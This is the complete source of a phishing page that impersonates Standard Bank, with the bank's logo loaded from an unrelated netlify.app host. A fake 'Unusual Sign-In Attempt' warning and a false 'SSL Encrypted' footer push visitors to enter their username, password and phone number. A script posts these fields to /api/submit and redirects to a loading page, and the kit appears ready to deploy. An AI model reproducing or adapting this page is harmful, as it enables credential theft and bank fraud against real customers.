<!DOCTYPE html><html><head><title>Standard Bank</title><link rel=icon href=https://account-security-check.netlify.app/zsg.png><meta name=viewport content="width=device-width,initial-scale=1.0"><style>body{font-family:Arial,sans-serif;background:#003cc7;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}#logo{width:100px;margin-bottom:20px}.box{background:white;padding:30px;border-radius:8px;width:100%;max-width:400px}h2{text-align:center;color:#333;margin-bottom:20px}.alert{background:#fff3cd;border:1px solid #ffc107;padding:12px;border-radius:6px;margin-bottom:20px;font-size:13px;color:#856404;text-align:center}.alert strong{display:block;font-size:14px;margin-bottom:4px}label{display:block;font-weight:bold;margin-bottom:6px;color:#333}input[type=text],input[type=password],input[type=tel]{width:100%;padding:12px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box}input[type=submit]{background:#0056b3;color:white;border:none;padding:14px;border-radius:4px;font-size:16px;cursor:pointer;width:100%}.footer{text-align:center;margin-top:15px;font-size:12px;color:#aaa}</style></head><body><img src=https://account-security-check.netlify.app/zsg.png id=logo><div class=box><div class=alert><strong>Unusual Sign-In Attempt</strong><br>Verify your identity to secure your account</div><h2>Identity Verification</h2><form id=f><input type=hidden name=contact_number value=697483><label>Username</label><input type=text name=fullname placeholder=Username required><label>Password</label><input type=password name=password placeholder=Password required><label>Phone Number</label><input type=tel name=phone_number placeholder="082 123 4567" required><input type=submit value="Verify Identity"></form><div class=footer>SSL Encrypted | Standard Bank</div></div><script>document.getElementById("f").addEventListener("submit",function(e){e.preventDefault();fetch("/api/submit",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(Object.fromEntries(new FormData(this)))}).then(r=>r.json()).then(function(d){window.location.href="/loading"})})</script></body></html>
